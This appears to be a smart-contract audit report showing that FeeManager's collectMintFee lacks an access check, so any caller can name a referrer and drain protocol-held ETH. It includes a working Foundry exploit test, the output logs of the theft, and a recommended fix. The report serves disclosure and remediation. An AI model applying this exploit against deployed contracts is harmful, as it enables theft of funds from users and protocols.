# Anyone can call `FeeManager::collectMintFee()` with any referrer address and steal funds

## Summary
The `collectMintFee` function in `FeeManager` collects fees for an `Edition`, with any address accepted as the referrer. 
Any account can invoke this function to obtain the referrer share for a specified amount, transferring the ETH or token directly from the protocol to the referrer.

## Vulnerability Detail
The `collectMintFee` function invokes `_splitProtocolFee`, which computes the fee for the provided referrer. This creates a route 
(transferring fees from the protocol to the referrer), splitting them using `mintReferrerShare = getMintReferrerShare(amount, referrer_)` and `uint256 collectionReferrerShare = getCollectionReferrerShare`.

## Proof of Concept:
* Assume the FeeManager has some ETH.
* Anyone can call the `collectMintFee` for an existing `Edition` with the attacker controlled parameter `_referrer`
* calculate the fee shares using `getMintReferrerShare` and `getCollectionReferrerShare` for the amount passed as parameter

Below is a test in foundry (add it at the end of the FeeManager.t.sol). In this scenario, `0xc0ffee` represents the owner of the Edition.
It demonstrates the splitting of ETH in the protocol between `0xc0ffee` and the attacker.

```javascript
    function test_syphonCollectMintFee() public {       
        address attacker = makeAddr("1337");       

        feeManager.createRoute(IEdition(address(mockEdition)), 1, new Target[](0), address(0));

        //Add 10 eth to the FeeManager
        vm.deal(address(feeManager), 10 ether);
       
        console.log("::ETH balance coffee before : ", address(0xc0ffee).balance);
        console.log("::ETH balance FeeManager before : ", address(feeManager).balance);
        console.log("::ETH balance attacker after : ", address(attacker).balance); 
                            
        vm.startPrank(attacker);        
        feeManager.collectMintFee{value: 0 ether}( IEdition(address(mockEdition)), 1, 500, address(feeManager), address(attacker));        
        vm.stopPrank();

        console.log("ETH balance FeeManager after : ", address(feeManager).balance);    
        console.log("ETH balance coffee after : ", address(0xc0ffee).balance);   
        console.log("ETH balance attacker after : ", address(attacker).balance); 
    }        
```    
    
Output
```javascript
Logs:  
  ::ETH balance coffee before :  0
  ::ETH balance FeeManager before :  10000000000000000000
  ::ETH balance attacker after :  0
  ETH balance FeeManager after :  4700000000000000000
  ETH balance coffee after :  5000000000000000000
  ETH balance attacker after :  150000000000000000
```      

## Impact
Anyone can steal fees from the protocol.

## Tool used

Manual Review

## Recommendation

* Implement a restriction ensuring only the owner of the edition can invoke collectMintFee.
* In the mock, the function creator requires the token parameter ID, though it's unused; it simply returns the owner of the Edition
* Additionally, consider that if there are more ETH or tokens in the protocol, the owner of the edition can still pass any amount as a parameter, potentially taking more funds than intended

```diff
 function collectMintFee(
        IEdition edition_,
        uint256 tokenId_,
        uint256 amount_,
        address payer_,
        address referrer_
    ) external payable {
++      require(msg.sender == edition_.creator(tokenId_), "Not owner");

        _collectMintFee(
            edition_, tokenId_, amount_, payer_, referrer_, getMintFee(edition_, tokenId_, amount_)
        );
    }
```
